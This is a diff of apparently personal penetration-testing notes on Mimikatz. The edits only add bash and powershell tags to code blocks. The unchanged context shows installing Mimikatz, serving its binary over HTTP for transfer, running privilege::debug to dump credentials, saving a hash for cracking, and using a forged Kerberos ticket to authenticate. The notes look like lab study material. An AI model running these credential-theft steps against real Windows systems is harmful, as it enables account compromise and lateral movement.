@@ -25,11 +25,11 @@ How? The credential material stored in LSASS and other Windows subsystems can be
 
 ### setup mimikatz
 
-```
+```bash
 sudo apt install mimikatz
 ```
 
-```
+```bash
 root@kali:~# mimikatz -h
 
 > mimikatz ~ Uses admin rights on Windows to display passwords in plaintext
@@ -53,7 +53,7 @@ now you have all the binaries!
 
 OR 
 
-```
+```bash
 git clone https://github.com/gentilkiwi/mimikatz
 
 # Pre-compiled binaries (releases)
@@ -81,7 +81,7 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 ```
 
 serve mimikatz binary from folder where you saved all the exploits (handy to do)
-```
+```bash
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
@@ -230,7 +230,7 @@ SID               :
 - - Use Alice's  SelmpersonatePrivilege -> token elevation possible
 	- all local admin accounts have this privilege enabled by default
 
-```  
+```
 mimikatz # privilege::debug  
 Privilege '20' OK  
   
@@ -260,7 +260,7 @@ User : user-2
 ```  
   
 save hash  to kali to crack it using hashcat, johntheripper, etc.... 
-```  
+```bash  
 kali@kali:~/password_attacks$ cat user-2.hash      
 NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN  
 ```  
@@ -429,7 +429,7 @@ Bye!
 - result: IIS app perspective - current user is built-in local admin (relative id (RID) $\coloneq$ 500) & member of priv groups (incl domain admins group - RID $\coloneq$ 512)  
   
 run KLIST to confirm that :D ticket ready to use in memory  
-```  
+```powershell 
 PS C:\Tools> klist
 
 Current LogonId is 0:0xXXXXXX
@@ -452,7 +452,7 @@ Cached Tickets: (1)
 - If the ticket is accepted by the target service, integrated authentication may succeed for that service context using fakeadmin! 
 
 let's say service was HTTP: 
-```  
+```powershell
 PS C:\Tools> iwr -UseDefaultCredentials http://hostname
 
 StatusCode        : 200
